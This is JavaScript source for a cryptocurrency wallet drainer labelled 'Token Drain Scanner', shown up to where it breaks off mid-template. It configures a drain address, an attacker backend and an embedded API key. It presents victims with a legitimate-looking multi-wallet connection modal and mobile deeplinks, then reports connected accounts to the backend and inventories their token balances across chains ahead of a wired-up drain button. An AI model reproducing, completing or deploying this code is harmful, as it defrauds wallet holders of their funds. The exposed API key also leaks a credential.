// ================================================
// TOKEN DRAIN SCANNER - ENHANCED WALLET SUPPORT
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum Mainnet",
        56: "Binance Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos"
    },
    
    // Wallet configurations - UPDATED with correct deeplinks
    wallets: {
        metaMask: {
            name: "MetaMask",
            icon: "🦊",
            color: "#f6851b",
            desktop: {
                id: "isMetaMask",
                download: "https://metamask.io/download/"
            },
            mobile: {
                ios: "https://metamask.app.link/dapp/",
                android: "https://metamask.app.link/dapp/",
                universal: "https://metamask.app.link/dapp/"
            }
        },
        trust: {
            name: "Trust Wallet",
            icon: "🔶",
            color: "#3375bb",
            desktop: {
                id: "isTrust",
                download: "https://trustwallet.com/"
            },
            mobile: {
                ios: "https://link.trustwallet.com/open_url?coin_id=60&url=",
                android: "https://link.trustwallet.com/open_url?coin_id=60&url=",
                universal: "https://link.trustwallet.com/open_url?coin_id=60&url="
            }
        },
        binance: {
            name: "Binance Wallet",
            icon: "🟡",
            color: "#f0b90b",
            desktop: {
                id: "isBinance",
                download: "https://www.binance.com/en/download"
            },
            mobile: {
                ios: "bnc://app.binance.com/",
                android: "intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end",
                universal: "https://binance.com/"
            }
        },
        coinbase: {
            name: "Coinbase Wallet",
            icon: "🔷",
            color: "#0052ff",
            desktop: {
                id: "isCoinbaseWallet",
                download: "https://www.coinbase.com/wallet/downloads"
            },
            mobile: {
                ios: "cbwallet://",
                android: "intent://#Intent;scheme=cbwallet;package=org.toshi;end",
                universal: "https://go.cb-w.com/"
            }
        },
        phantom: {
            name: "Phantom",
            icon: "👻",
            color: "#ab9ff2",
            desktop: {
                id: "isPhantom",
                download: "https://phantom.app/"
            },
            mobile: {
                ios: "phantom://",
                android: "phantom://",
                universal: "https://phantom.app/"
            }
        },
        exodus: {
            name: "Exodus",
            icon: "🌌",
            color: "#1d1534",
            desktop: {
                id: "isExodus",
                download: "https://www.exodus.com/download/"
            },
            mobile: {
                ios: "exodus://",
                android: "exodus://",
                universal: "https://exodus.com/mobile"
            }
        },
        okx: {
            name: "OKX Wallet",
            icon: "⚡",
            color: "#000000",
            desktop: {
                id: "isOkxWallet",
                download: "https://www.okx.com/download"
            },
            mobile: {
                ios: "okx://",
                android: "intent://#Intent;scheme=okx;package=com.okinc.okex.gp;end",
                universal: "https://www.okx.com/download"
            }
        },
        tokenPocket: {
            name: "TokenPocket",
            icon: "👛",
            color: "#2980ff",
            desktop: {
                id: "isTokenPocket",
                download: "https://tokenpocket.pro/"
            },
            mobile: {
                ios: "tpoutside://",
                android: "tpoutside://",
                universal: "https://tokenpocket.pro/"
            }
        },
        safePal: {
            name: "SafePal",
            icon: "🛡️",
            color: "#4c6fff",
            desktop: {
                id: "isSafePal",
                download: "https://www.safepal.com/download"
            },
            mobile: {
                ios: "safepal://",
                android: "safepal://",
                universal: "https://www.safepal.com/download"
            }
        },
        argent: {
            name: "Argent",
            icon: "🅰️",
            color: "#ff875b",
            desktop: {
                id: "isArgent",
                download: "https://www.argent.xyz/"
            },
            mobile: {
                ios: "argent://",
                android: "argent://",
                universal: "https://www.argent.xyz/"
            }
        },
        rainbow: {
            name: "Rainbow",
            icon: "🌈",
            color: "#001e59",
            desktop: {
                id: "isRainbow",
                download: "https://rainbow.me/"
            },
            mobile: {
                ios: "rainbow://",
                android: "rainbow://",
                universal: "https://rainbow.me/"
            }
        },
        zengo: {
            name: "Zengo",
            icon: "🛡️",
            color: "#000000",
            desktop: {
                id: "isZengo",
                download: "https://zengo.com/"
            },
            mobile: {
                ios: "zengo://",
                android: "zengo://",
                universal: "https://zengo.com/"
            }
        },
        ledger: {
            name: "Ledger Live",
            icon: "🔒",
            color: "#000000",
            desktop: {
                id: "isLedger",
                download: "https://www.ledger.com/ledger-live"
            },
            mobile: {
                ios: "ledgerlive://",
                android: "ledgerlive://",
                universal: "https://www.ledger.com/ledger-live"
            }
        }
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let walletProvider = null;
let isMobile = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, networkSelector, scanAllBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    
    // Detect device type
    detectDevice();
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    networkSelector = document.getElementById('networkSelector');
    scanAllBtn = document.getElementById('scanAllBtn');
    
    // Verify critical elements
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    console.log('✅ DOM elements loaded');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    if (scanAllBtn) scanAllBtn.onclick = handleScanAllChains;
    if (networkSelector) networkSelector.onchange = handleNetworkChange;
    
    // Populate network selector
    populateNetworkSelector();
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Detect device type
function detectDevice() {
    const userAgent = navigator.userAgent.toLowerCase();
    isMobile = /android|webos|iphone|ipad|ipod|blackberry|windows phone/.test(userAgent);
}

// Populate network selector dropdown
function populateNetworkSelector() {
    if (!networkSelector) return;
    
    networkSelector.innerHTML = '';
    
    // Add "Switch Network" option
    const defaultOption = document.createElement('option');
    defaultOption.value = '';
    defaultOption.textContent = 'Switch Network';
    networkSelector.appendChild(defaultOption);
    
    // Add all supported networks
    Object.entries(CONFIG.networkNames).forEach(([chainId, name]) => {
        const option = document.createElement('option');
        option.value = chainId;
        option.textContent = `🌐 ${name}`;
        networkSelector.appendChild(option);
    });
}

// Check existing wallet connection
async function checkExistingConnection() {
    const ethereum = getEthereum();
    if (!ethereum) {
        console.log('⚠️ No wallet provider');
        return;
    }
    
    try {
        const accounts = await ethereum.request({ 
            method: 'eth_accounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await ethereum.request({ 
                method: 'eth_chainId' 
            });
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId);
        }
    } catch (error) {
        console.log('⚠️', error.message);
    }
}

// Get Ethereum provider - ENHANCED DETECTION
function getEthereum() {
    // Check for various wallet providers
    const providers = [
        { name: 'metaMask', check: () => window.ethereum?.isMetaMask, provider: window.ethereum },
        { name: 'trust', check: () => window.ethereum?.isTrust, provider: window.ethereum },
        { name: 'binance', check: () => window.ethereum?.isBinance || window.BinanceChain, provider: window.ethereum || window.BinanceChain },
        { name: 'coinbase', check: () => window.ethereum?.isCoinbaseWallet, provider: window.ethereum },
        { name: 'phantom', check: () => window.ethereum?.isPhantom, provider: window.ethereum },
        { name: 'okx', check: () => window.ethereum?.isOkxWallet, provider: window.ethereum },
        { name: 'tokenPocket', check: () => window.ethereum?.isTokenPocket, provider: window.ethereum },
        { name: 'exodus', check: () => window.ethereum?.isExodus, provider: window.ethereum },
        { name: 'rainbow', check: () => window.ethereum?.isRainbow, provider: window.ethereum },
        { name: 'argent', check: () => window.ethereum?.isArgent, provider: window.ethereum },
        { name: 'safePal', check: () => window.ethereum?.isSafePal, provider: window.ethereum },
        { name: 'zengo', check: () => window.ethereum?.isZengo, provider: window.ethereum },
        { name: 'ledger', check: () => window.ethereum?.isLedger, provider: window.ethereum },
        { name: 'generic', check: () => window.ethereum, provider: window.ethereum }
    ];
    
    for (const providerInfo of providers) {
        if (providerInfo.check()) {
            walletProvider = providerInfo.name;
            console.log(`✅ Detected wallet: ${providerInfo.name}`);
            return providerInfo.provider;
        }
    }
    
    console.log('❌ No wallet provider found');
    return null;
}

// Handle connect button click
async function handleConnect() {
    console.log('🔄 Connect button clicked');
    
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    // On mobile, check if we're in a wallet browser
    if (isMobile) {
        await handleMobileConnect();
        return;
    }
    
    // On desktop, show enhanced wallet selector
    await handleDesktopConnect();
}

// Handle desktop connection with enhanced selector
async function handleDesktopConnect() {
    // Detect available wallets
    const availableWallets = detectAvailableWallets();
    
    if (availableWallets.length === 0) {
        updateStatus('❌ No wallet found!');
        showWalletInstallGuide();
        return;
    }
    
    // Show enhanced wallet selector
    showEnhancedWalletSelector(availableWallets);
}

// Detect available wallets on desktop
function detectAvailableWallets() {
    const wallets = [];
    const allWallets = CONFIG.wallets;
    
    Object.entries(allWallets).forEach(([key, wallet]) => {
        const walletCheck = {
            'metaMask': () => window.ethereum?.isMetaMask,
            'trust': () => window.ethereum?.isTrust,
            'binance': () => window.ethereum?.isBinance || window.BinanceChain,
            'coinbase': () => window.ethereum?.isCoinbaseWallet,
            'phantom': () => window.ethereum?.isPhantom,
            'exodus': () => window.ethereum?.isExodus,
            'okx': () => window.ethereum?.isOkxWallet,
            'tokenPocket': () => window.ethereum?.isTokenPocket,
            'safePal': () => window.ethereum?.isSafePal,
            'argent': () => window.ethereum?.isArgent,
            'rainbow': () => window.ethereum?.isRainbow,
            'zengo': () => window.ethereum?.isZengo,
            'ledger': () => window.ethereum?.isLedger
        };
        
        if (walletCheck[key] && walletCheck[key]()) {
            wallets.push({ 
                key, 
                name: wallet.name, 
                icon: wallet.icon, 
                color: wallet.color 
            });
        }
    });
    
    console.log('📋 Available wallets:', wallets.map(w => w.name));
    return wallets;
}

// Show enhanced wallet selector (AppKit style)
function showEnhancedWalletSelector(wallets) {
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <h3>Connect Wallet</h3>
                    <button class="close-btn" onclick="closeWalletSelector()">×</button>
                </div>
                <p class="modal-subtitle">Choose your preferred wallet to continue</p>
                
                <div class="wallet-grid">
                    ${wallets.map(wallet => `
                        <button class="wallet-card" onclick="selectWallet('${wallet.key}')" style="--wallet-color: ${wallet.color}">
                            <div class="wallet-icon">${wallet.icon}</div>
                            <div class="wallet-info">
                                <span class="wallet-name">${wallet.name}</span>
                                <span class="wallet-status">Detected</span>
                            </div>
                            <div class="arrow">→</div>
                        </button>
                    `).join('')}
                </div>
                
                <div class="other-options">
                    <h4>Don't have a wallet?</h4>
                    <div class="download-options">
                        <a href="https://metamask.io/download/" target="_blank" class="download-btn" style="background: #f6851b">
                            <span>🦊</span>
                            <span>Get MetaMask</span>
                        </a>
                        <a href="https://trustwallet.com/" target="_blank" class="download-btn" style="background: #3375bb">
                            <span>🔶</span>
                            <span>Get Trust Wallet</span>
                        </a>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    // Create and show selector
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    // Add CSS for enhanced selector
    addEnhancedSelectorStyles();
}

// Add CSS for enhanced wallet selector
function addEnhancedSelectorStyles() {
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            animation: fadeIn 0.3s ease;
        }
        
        .wallet-selector-modal {
            background: white;
            border-radius: 24px;
            width: 90%;
            max-width: 480px;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.4s ease;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px 32px;
            border-bottom: 1px solid #eef0f3;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 24px;
            font-weight: 700;
            color: #111827;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 32px;
            cursor: pointer;
            color: #6b7280;
            line-height: 1;
            padding: 0;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }
        
        .close-btn:hover {
            background: #f3f4f6;
            color: #111827;
        }
        
        .modal-subtitle {
            padding: 0 32px 24px;
            margin: 0;
            color: #6b7280;
            font-size: 16px;
        }
        
        .wallet-grid {
            padding: 0 24px 24px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .wallet-card {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 18px 20px;
            background: white;
            border: 2px solid #e5e7eb;
            border-radius: 16px;
            cursor: pointer;
            transition: all 0.2s;
            text-align: left;
            width: 100%;
        }
        
        .wallet-card:hover {
            border-color: var(--wallet-color);
            background: linear-gradient(to right, rgba(var(--wallet-color-rgb), 0.02), transparent);
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }
        
        .wallet-icon {
            font-size: 32px;
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: linear-gradient(135deg, var(--wallet-color), color-mix(in srgb, var(--wallet-color) 80%, white));
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .wallet-info {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        
        .wallet-name {
            font-weight: 600;
            font-size: 17px;
            color: #111827;
        }
        
        .wallet-status {
            font-size: 14px;
            color: #10b981;
            font-weight: 500;
        }
        
        .arrow {
            color: #9ca3af;
            font-size: 20px;
            font-weight: 300;
        }
        
        .other-options {
            padding: 24px 32px;
            border-top: 1px solid #eef0f3;
            background: #f9fafb;
            border-radius: 0 0 24px 24px;
        }
        
        .other-options h4 {
            margin: 0 0 16px;
            font-size: 18px;
            color: #374151;
            text-align: center;
        }
        
        .download-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        
        .download-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 14px;
            border-radius: 12px;
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            transition: transform 0.2s, opacity 0.2s;
        }
        
        .download-btn:hover {
            transform: translateY(-2px);
            opacity: 0.9;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(40px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        /* Mobile responsive */
        @media (max-width: 480px) {
            .wallet-selector-modal {
                width: 95%;
                border-radius: 20px;
            }
            
            .modal-header {
                padding: 20px 24px;
            }
            
            .wallet-grid {
                padding: 0 16px 20px;
            }
            
            .wallet-card {
                padding: 16px;
            }
            
            .download-options {
                grid-template-columns: 1fr;
            }
        }
    `;
    
    // Convert color to RGB for opacity
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) {
        selector.style.animation = 'fadeOut 0.3s ease';
        selector.querySelector('.wallet-selector-modal').style.animation = 'slideDown 0.4s ease';
        
        setTimeout(() => {
            selector.remove();
        }, 300);
    }
}

// Select wallet from selector
async function selectWallet(walletKey) {
    closeWalletSelector();
    walletProvider = walletKey;
    await connectWithWallet(walletKey);
}

// Connect with specific wallet
async function connectWithWallet(walletKey) {
    updateStatus(`🔄 Connecting with ${CONFIG.wallets[walletKey]?.name || walletKey}...`);
    
    try {
        const ethereum = getEthereum();
        if (!ethereum) {
            throw new Error('Wallet not found');
        }
        
        // Special handling for Binance Chain
        if (walletKey === 'binance' && window.BinanceChain) {
            await connectWithBinance();
            return;
        }
        
        // Request accounts for other wallets
        console.log(`📤 Requesting accounts from ${walletKey}...`);
        const accounts = await ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        console.log('✅ Wallet response:', accounts);
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        // Get chain ID
        const chainIdHex = await ethereum.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Connection error:', error);
        
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected');
        } else if (error.code === -32002) {
            updateStatus('🔄 Connection pending. Check wallet.');
        } else {
            updateStatus('❌ Failed: ' + error.message);
        }
    }
}

// Connect with Binance Chain (special handling)
async function connectWithBinance() {
    try {
        // Binance Chain uses different methods
        const accounts = await window.BinanceChain.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        // Get chain ID
        const chainIdHex = await window.BinanceChain.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Binance connection error:', error);
        updateStatus('❌ Binance connection failed: ' + error.message);
    }
}

// Handle mobile connection
async function handleMobileConnect() {
    // Check if we're already in a wallet browser
    const ethereum = getEthereum();
    if (ethereum) {
        // Already in wallet browser, connect normally
        await connectWithWallet(walletProvider || 'metaMask');
        return;
    }
    
    // Not in wallet browser, show mobile wallet options
    showMobileWalletOptions();
}

// Show mobile wallet options
function showMobileWalletOptions() {
    const popularMobileWallets = ['metaMask', 'trust', 'coinbase', 'binance', 'phantom', 'exodus'];
    
    let html = `
        <div class="mobile-wallet-connect">
            <h3 style="margin-top: 0; color: white; text-align: center;">📱 Connect Mobile Wallet</h3>
            <p style="color: rgba(255,255,255,0.8); text-align: center; margin-bottom: 30px;">
                Open this dApp in your wallet's built-in browser:
            </p>
            <div class="mobile-wallet-grid">
    `;
    
    popularMobileWallets.forEach(walletKey => {
        const wallet = CONFIG.wallets[walletKey];
        if (!wallet) return;
        
        const currentUrl = encodeURIComponent(window.location.href);
        let walletUrl = '';
        
        // Determine correct deeplink
        if (navigator.userAgent.toLowerCase().includes('iphone') || 
            navigator.userAgent.toLowerCase().includes('ipad')) {
            walletUrl = wallet.mobile.ios + currentUrl;
        } else if (navigator.userAgent.toLowerCase().includes('android')) {
            walletUrl = wallet.mobile.android + currentUrl;
        } else {
            walletUrl = wallet.mobile.universal + currentUrl;
        }
        
        // Special handling for Binance on mobile
        if (walletKey === 'binance') {
            walletUrl = 'https://www.binance.com/en/wallet-link?redirect=' + currentUrl;
        }
        
        html += `
            <a href="${walletUrl}" class="mobile-wallet-btn" style="background: ${wallet.color}"
               onclick="handleMobileWalletClick('${walletKey}')">
                <span class="mobile-wallet-icon">${wallet.icon}</span>
                <span class="mobile-wallet-name">${wallet.name}</span>
            </a>
        `;
    });
    
    html += `
            </div>
            <div class="mobile-instructions">
                <p style="font-size: 14px; color: rgba(255,255,255,0.7); margin-top: 30px;">
                    <strong>Tip:</strong> If the app doesn't open automatically:
                </p>
                <div class="manual-steps">
                    <div class="step">1. Open your wallet app</div>
                    <div class="step">2. Go to browser/DApps section</div>
                    <div class="step">3. Paste this URL:</div>
                </div>
                <div class="url-copy-box">
                    <input type="text" readonly value="${window.location.href}" class="url-input">
                    <button onclick="copyMobileUrl()" class="copy-btn">Copy</button>
                </div>
            </div>
        </div>
        
        <style>
            .mobile-wallet-connect {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                padding: 30px 25px;
                border-radius: 24px;
                margin: 20px 0;
            }
            
            .mobile-wallet-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 16px;
            }
            
            .mobile-wallet-btn {
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                padding: 25px 15px;
                border-radius: 18px;
                color: white;
                text-decoration: none;
                text-align: center;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.2);
                transition: all 0.3s;
            }
            
            .mobile-wallet-btn:hover {
                transform: translateY(-5px);
                box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
            }
            
            .mobile-wallet-icon {
                font-size: 36px;
                margin-bottom: 12px;
            }
            
            .mobile-wallet-name {
                font-weight: 600;
                font-size: 16px;
            }
            
            .manual-steps {
                background: rgba(0, 0, 0, 0.2);
                border-radius: 12px;
                padding: 15px;
                margin: 15px 0;
            }
            
            .step {
                padding: 8px 0;
                color: white;
                font-size: 14px;
            }
            
            .url-copy-box {
                display: flex;
                gap: 10px;
                margin-top: 10px;
            }
            
            .url-input {
                flex: 1;
                padding: 12px 16px;
                border: 2px solid rgba(255,255,255,0.2);
                border-radius: 10px;
                background: rgba(0,0,0,0.3);
                color: white;
                font-size: 14px;
            }
            
            .copy-btn {
                padding: 12px 24px;
                background: white;
                color: #764ba2;
                border: none;
                border-radius: 10px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.2s;
            }
            
            .copy-btn:hover {
                background: #f0f0f0;
                transform: scale(1.05);
            }
            
            @media (max-width: 480px) {
                .mobile-wallet-grid {
                    grid-template-columns: 1fr;
                }
                
                .mobile-wallet-btn {
                    padding: 20px 15px;
                }
            }
        </style>
    `;
    
    statusEl.innerHTML = html;
}

// Copy URL for mobile
function copyMobileUrl() {
    const urlInput = document.querySelector('.url-input');
    if (urlInput) {
        urlInput.select();
        document.execCommand('copy');
        
        const copyBtn = document.querySelector('.copy-btn');
        if (copyBtn) {
            const originalText = copyBtn.textContent;
            copyBtn.textContent = 'Copied!';
            copyBtn.style.background = '#10b981';
            copyBtn.style.color = 'white';
            
            setTimeout(() => {
                copyBtn.textContent = originalText;
                copyBtn.style.background = 'white';
                copyBtn.style.color = '#764ba2';
            }, 2000);
        }
    }
}

// Handle mobile wallet click
function handleMobileWalletClick(walletKey) {
    console.log('📱 Opening wallet:', walletKey);
    walletProvider = walletKey;
    
    // Store for when user returns
    localStorage.setItem('mobileWallet', walletKey);
    
    // For Android, handle intent fallback
    if (navigator.userAgent.toLowerCase().includes('android')) {
        setTimeout(() => {
            // Check if page is still visible (wallet didn't open)
            if (document.visibilityState === 'visible') {
                // Show instructions modal
                showMobileInstructionsModal();
            }
        }, 1500);
    }
}

// Show mobile instructions modal
function showMobileInstructionsModal() {
    const modalHTML = `
        <div class="mobile-instructions-modal">
            <div class="modal-content">
                <h3>Wallet Not Opening?</h3>
                <p>Follow these steps:</p>
                <ol>
                    <li>Open your wallet app manually</li>
                    <li>Go to browser/DApps section</li>
                    <li>Paste the URL from the previous screen</li>
                </ol>
                <button onclick="closeMobileInstructions()" class="modal-close-btn">Got it</button>
            </div>
        </div>
        <style>
            .mobile-instructions-modal {
                position: fixed;
                top: 0; left: 0; right: 0; bottom: 0;
                background: rgba(0,0,0,0.8);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10000;
                padding: 20px;
            }
            
            .modal-content {
                background: white;
                padding: 30px;
                border-radius: 20px;
                max-width: 400px;
                width: 100%;
                text-align: center;
            }
            
            .modal-content h3 {
                margin-top: 0;
                color: #333;
            }
            
            .modal-content ol {
                text-align: left;
                margin: 20px 0;
                padding-left: 20px;
            }
            
            .modal-content li {
                margin: 10px 0;
                color: #555;
            }
            
            .modal-close-btn {
                background: #4a6cf7;
                color: white;
                border: none;
                padding: 12px 30px;
                border-radius: 10px;
                font-size: 16px;
                cursor: pointer;
                margin-top: 20px;
            }
        </style>
    `;
    
    const modal = document.createElement('div');
    modal.innerHTML = modalHTML;
    document.body.appendChild(modal);
}

// Close mobile instructions
function closeMobileInstructions() {
    const modal = document.querySelector('.mobile-instructions-modal');
    if (modal) modal.remove();
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        console.log('🔄 Setting up connection...');
        
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Select current network in dropdown
        if (networkSelector) {
            networkSelector.value = chainId;
        }
        
        // Setup wallet listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    ethereum.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    ethereum.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        
        // Update network selector
        if (networkSelector) {
            networkSelector.value = chainId;
        }
        
        fetchTokens(currentAccount, chainId);
    });
    
    ethereum.on('disconnect', (error) => {
        console.log('🔌 Wallet disconnected:', error);
        disconnectWallet();
    });
}

// Handle network change from dropdown
async function handleNetworkChange() {
    if (!networkSelector || !networkSelector.value) return;
    
    const chainId = parseInt(networkSelector.value);
    if (!chainId || chainId === currentChainId) return;
    
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}...`);
        
        await ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
    } catch (switchError) {
        if (switchError.code === 4902) {
            try {
                await addNetworkToWallet(chainId);
            } catch (addError) {
                updateStatus(`❌ Failed to add network: ${addError.message}`);
            }
        } else {
            updateStatus(`❌ Failed to switch network: ${switchError.message}`);
        }
    }
}

// Add network to wallet
async function addNetworkToWallet(chainId) {
    const ethereum = getEthereum();
    if (!ethereum) return;
    
    const networkParams = {
        56: { // BSC
            chainId: '0x38',
            chainName: 'Binance Smart Chain',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
        },
        137: { // Polygon
            chainId: '0x89',
            chainName: 'Polygon',
            nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
            rpcUrls: ['https://polygon-rpc.com/'],
            blockExplorerUrls: ['https://polygonscan.com/']
        },
        42161: { // Arbitrum
            chainId: '0xA4B1',
            chainName: 'Arbitrum One',
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: ['https://arb1.arbitrum.io/rpc'],
            blockExplorerUrls: ['https://arbiscan.io/']
        }
    };
    
    if (networkParams[chainId]) {
        await ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [networkParams[chainId]],
        });
    }
}

// Fetch tokens for current chain
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
        
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <h4>${chainName}</h4>
                    <span class="token-count">${chainTokens.length} tokens</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item" data-address="${token.contractAddress || 'native'}" data-chain="${chainId}">
                        <div class="token-info">
